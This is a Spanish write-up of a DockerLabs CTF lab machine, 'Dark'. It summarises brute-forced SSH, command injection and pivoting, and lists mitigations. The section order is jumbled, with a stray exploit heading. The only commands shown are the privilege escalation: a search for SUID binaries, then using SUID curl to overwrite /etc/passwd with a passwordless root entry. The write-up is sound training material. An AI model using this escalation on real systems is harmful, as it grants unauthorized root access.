## Introducción

Este documento presenta la resolución completa de la máquina **Dark**, desarrollada por *makak77* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**. Esta máquina presenta un escenario de **pivoting** entre dos hosts interconectados.
El laboratorio expone dos hosts interconectados. En el primero, se identifica un formulario que permite acceder al segundo host y un usuario `toni` vulnerable a fuerza bruta en SSH. Tras obtener acceso como `toni`, se descubre una inyección de comandos en el segundo host que permite el pivoting hacia él.
Una vez dentro del segundo host como `www-data`, se identifica que el binario `curl` tiene permisos SUID, permitiendo sobrescribir `/etc/passwd` y obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

**Sesión 2 - Exploit:**---

### Recomendaciones de Mitigación

* Implementar políticas de contraseñas complejas y autenticación por clave SSH.
* Validar y sanitizar todos los parámetros de entrada para prevenir inyecciones de comandos.
* Auditar y eliminar bits SUID innecesarios, especialmente en binarios como `curl`.
* Configurar `HISTCONTROL=ignorespace` para proteger comandos sensibles en el historial.
* Implementar firewalls entre segmentos de red para prevenir pivoting no autorizado.

## Paso 4 — Escalada de privilegios en el Host 2

### 4.1 De www-data → root

Se normaliza la shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

Se buscan binarios con permisos SUID:

```bash
sudo -l
find / -perm -4000 2>/dev/null
```

![Find2](https://res.cloudinary.com/dewqswzke/image/upload/v1765871211/Find2_ovpltl.png)

Se identifica que `curl` tiene permisos SUID. Se sobrescribe `/etc/passwd`:

```bash
cp /etc/passwd /tmp/newpasswd
sed -i 's/^root:x:/root::/' /tmp/newpasswd
curl file:///tmp/newpasswd -o /etc/passwd
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1765871215/Root_rdx2oc.png)
